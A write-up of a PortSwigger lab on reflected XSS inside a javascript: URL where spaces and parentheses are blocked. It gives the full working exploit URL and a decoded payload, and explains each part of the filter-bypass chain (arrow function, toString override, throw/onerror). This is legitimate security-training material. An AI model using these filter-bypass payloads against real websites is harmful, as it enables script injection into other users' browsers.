# Lab 28: Reflected XSS in a JavaScript URL with some characters blocked

**Category:** Cross-Site Scripting (XSS)  
**Difficulty:** Expert  
**Lab link:** [Reflected XSS in a JavaScript URL with some characters blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked)

## Overview

The blog post page has a "Back to Blog" link whose `href` is a `javascript:` URL containing analytics code. The `postId` and full query string are reflected inside it. Spaces and parentheses `()` are blocked (server returns 400). The exploit chains arrow functions, toString override, and throw/onerror to call `alert` without using any blocked characters.

## Blocked Characters

- **Spaces** → use `/**/` (JS block comment)
- **`(` and `)`** → use arrow functions, toString override, and throw/onerror

## Solution

Visit the URL:
```
https://LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
```

Click the **"Back to Blog"** link to trigger the JavaScript URL.

## Payload Breakdown

URL-decoded injection:
```
'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

| Fragment | Purpose |
|----------|---------|
| `'` | Closes the `body:'...'` string |
| `}` | Closes the fetch options object |
| `,x=x=>{throw/**/onerror=alert,1337}` | Arrow function: sets `onerror=alert`, throws `1337` |
| `,toString=x` | Overwrites `toString` with the arrow function |
| `,window+''` | String concatenation calls `window.toString()` — now the arrow function |
| `,{x:'` | Opens new object to absorb trailing `'}` and keep syntax valid |

## The Chain (no parentheses anywhere)

1. **Arrow function** `x=>{...}` — defines a function without `()` (single param doesn't need parens)
2. **toString override** — installs the function as `toString`
3. **Implicit invocation** — `window+''` forces `.toString()` to be called internally by the JS engine
4. **throw/onerror** — inside the function, `onerror=alert` then `throw 1337` triggers the error handler (`alert`) without calling it with `()`

## Key Takeaways

- **Arrow functions bypass `()` restrictions.** Single-param arrows don't need parentheses: `x=>{code}`
- **toString override = implicit function call.** String concatenation (`obj+''`) calls `.toString()` internally — no `()` in your code
- **throw/onerror = function call without `()`.** Sets the error handler then throws to trigger it
- **Three techniques stacked:** Each blocked character requires its own bypass — Expert labs chain multiple creative workarounds
